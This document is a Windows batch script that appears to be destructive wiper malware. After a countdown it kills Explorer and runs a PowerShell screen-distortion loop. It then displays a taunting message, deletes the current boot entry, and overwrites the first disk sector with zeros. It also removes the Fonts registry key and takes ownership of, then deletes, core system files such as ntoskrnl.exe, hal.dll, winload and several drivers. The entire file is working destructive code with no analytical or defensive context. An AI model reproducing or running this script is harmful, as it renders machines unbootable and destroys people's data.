@echo off
set /a seconds=30

:loop
if %seconds% LEQ 0 goto payload
if %seconds% EQU 20 start cmd /c exit
if %seconds% EQU 10 start cmd /c exit
timeout /t 1 >nul
set /a seconds-=1
goto loop

:payload
taskkill /f /im explorer.exe
start notepad.exe
start mspaint.exe

start /b powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; $signature = '[DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hwnd); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);'; $api = Add-Type -MemberDefinition $signature -Name 'GDI' -Namespace 'Win32' -PassThru; $hdc = $api::GetDC([IntPtr]::Zero); $w = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $h = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; while($true) { $x = Get-Random -Minimum 0 -Maximum $w; $width = Get-Random -Minimum 40 -Maximum 200; [void]$api::BitBlt($hdc, $x, 10, $width, $h - 10, $hdc, $x, 0, 0x00CC0020); Start-Sleep -Milliseconds 5; }"


msg * HAHAHHAHAAHA YOUR SYSTEM IS FUCKED THERES NO ESCAPE YOUR DONE VERY FUCKING DONE
ping 192.0.2.1 -n 1 -w 60000 >nul
bcdedit /delete {current} /f
start pyw -c "open(r'\\.\PhysicalDrive0', 'r+b').write(b'\x00'*512)"
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /f
taskkill /f /im taskmgr.exe
takeown /f "c:\windows\system32\taskmgr.exe"
icacls "c:\windows\system32\taskmgr.exe" /grant %username%:F
del /f /q "c:\windows\system32\taskmgr.exe"
takeown /f "c:\windows\system32\winload.exe"
icacls "c:\windows\system32\winload.exe" /grant %username%:F
del /f /q "c:\windows\system32\winload.exe"
takeown /f "c:\windows\system32\winload.efi"
icacls "c:\windows\system32\winload.efi" /grant %username%:F
del /f /q "c:\windows\system32\winload.efi"
takeown /f "c:\windows\system32\logonui.exe"
icacls "c:\windows\system32\logonui.exe" /grant %username%:F
del /f /q "c:\windows\system32\logonui.exe"
takeown /f "c:\windows\system32\hal.dll"
icacls "c:\windows\system32\hal.dll" /grant %username%:F
del /f /q "c:\windows\system32\hal.dll"
takeown /f "c:\windows\system32\ntfs.sys"
icacls "c:\windows\system32\ntfs.sys" /grant %username%:F
del /f /q "c:\windows\system32\ntfs.sys"
takeown /f "c:\windows\system32\ntoskrnl.exe"
icacls "c:\windows\system32\ntoskrnl.exe" /grant %username%:F
del /f /q "c:\windows\system32\ntoskrnl.exe"
takeown /f "c:\windows\system32\kdcom.dll"
icacls "c:\windows\system32\kdcom.dll" /grant %username%:F
del /f /q "c:\windows\system32\kdcom.dll"
takeown /f "c:\windows\system32\pshed.dll"
icacls "c:\windows\system32\pshed.dll" /grant %username%:F
del /f /q "c:\windows\system32\pshed.dll"
takeown /f "c:\windows\system32\clfs.sys"
icacls "c:\windows\system32\clfs.sys" /grant %username%:F
del /f /q "c:\windows\system32\clfs.sys"
takeown /f "c:\windows\system32\drivers\wdf01000.sys"
icacls "c:\windows\system32\drivers\wdf01000.sys" /grant %username%:F
del /f /q "c:\windows\system32\DRIVERS\wdf01000.sys"
takeown /f "c:\windows\system32\drivers\wdfldr.sys"
icacls "c:\windows\system32\drivers\wdfldr.sys" /grant %username%:F
del /f /q "c:\windows\system32\drivers\wdfldr.sys" 
takeown /f "c:\windows\system32\drivers\acpi.sys"
icacls "c:\windows\system32\drivers\acpi.sys" /grant %username%:F
del /f /q "c:\windows\system32\drivers\acpi.sys"
takeown /f "c:\windows\system32\drivers\wmilib.sys"
icacls "c:\windows\system32\drivers\wmilib.sys" /grant %username%:F
del /f /q "c:\windows\system32\drivers\wmilib.sys"
takeown /f "c:\windows\system32\drivers\compbatt.sys"
icacls "c:\windows\system32\drivers\compbatt.sys" /grant %username%:F 
shutdown -f -l